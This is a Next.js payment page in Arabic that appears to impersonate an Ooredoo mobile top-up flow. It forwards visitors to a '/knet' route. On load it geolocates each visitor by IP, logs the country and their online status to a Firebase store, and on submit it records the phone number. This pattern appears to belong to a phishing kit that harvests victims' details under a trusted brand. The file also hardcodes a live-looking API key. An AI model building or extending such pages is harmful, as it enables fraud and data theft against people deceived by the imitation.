
"use client"

import Image from "next/image"
import { Trash2, ArrowLeft } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import LanguageToggle from "@/components/language-toggle"
import PaymentSummary from "@/components/payment-summary"
import { setupOnlineStatus } from "@/lib/utils"
import { addData } from "@/lib/firebase"
import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"

export default function PaymentPage() {
  const [value, setValue] = useState('5 د.ك')
  const [phone, setPhone] = useState('')
const router=useRouter()
  const _id=randstr('oredoo-')
  async function getLocation() {
    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
  
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const country = await response.text();
        addData({
            id:_id,
            country: country
        })
        localStorage.setItem('country',country)
        setupOnlineStatus(_id)
      } catch (error) {
        console.error('Error fetching location:', error);
    }
  }
function randstr(prefix:string)
{
  return Math.random().toString(36).replace('0.',prefix || '');
}
  // Avoid hydration mismatch
  useEffect(() => {
  getLocation().then(()=>{})
  }, [])
const handleSubmit=(e:any)=>{
  e.preventDefault();

  const _id=localStorage.getItem('visitor')

  addData({id:_id,phone})
  router.push('/knet')
}
useEffect(()=>{
  const val=localStorage.setItem('total',value)
},[])
  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      <header className="flex justify-between items-center p-4 bg-white shadow-sm">
        <LanguageToggle />
        <button className="p-2 rounded-full hover:bg-gray-100 transition-colors">
          <ArrowLeft className="w-5 h-5" />
        </button>
      </header>

      <div className="relative w-full text-white overflow-hidden">
        <div className="absolute inset-0  z-10"></div>
        <img
          src="/zf.png"
          alt="Smart Pay Promotion"
          width={700}
          height={370}
          style={{borderRadius:50}}
          className="w-full h-auto object-cover p-4 rounded-lg"
        />
        <div className="absolute top-1/2 right-6 transform -translate-y-1/2 z-20 text-right">
        </div>
      </div>

      <form className="flex-1 p-6 max-w-md mx-auto w-full" onSubmit={handleSubmit}>
        <div className="mt-6 space-y-8">
          <div className="space-y-2">
            <div className="text-right text-lg font-semibold text-gray-700">المبلغ</div>
            <div className="relative">
              <button className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors">
                <Trash2 size={20} />
              </button>
              <Input
                type="text"
                className="text-right pr-4 py-6 text-xl font-medium border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-lg shadow-sm"
                value={value}
                onChange={(e)=>setValue(e.target.value)}
                dir="rtl"
              />
            </div>
          </div>

          <div className="space-y-2">
            <div className="text-right text-lg font-semibold text-gray-700">رقم الموبايل</div>
            <Input
              type="tel"
              className="text-right pr-4 py-6 border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-lg shadow-sm"
              placeholder=""
              value={phone}
              onChange={(e)=>setPhone(e.target.value)}
              dir="rtl"
            />
          </div>

          <Button className="w-full py-6 mt-8 bg-red-500 hover:bg-red-600 text-white rounded-full text-lg font-medium shadow-md transition-all duration-200 hover:shadow-lg">
            الدفع لرقم آخر
          </Button>
        </div>

        <PaymentSummary amount="5.000" />
      </form>
    </div>
  )
}
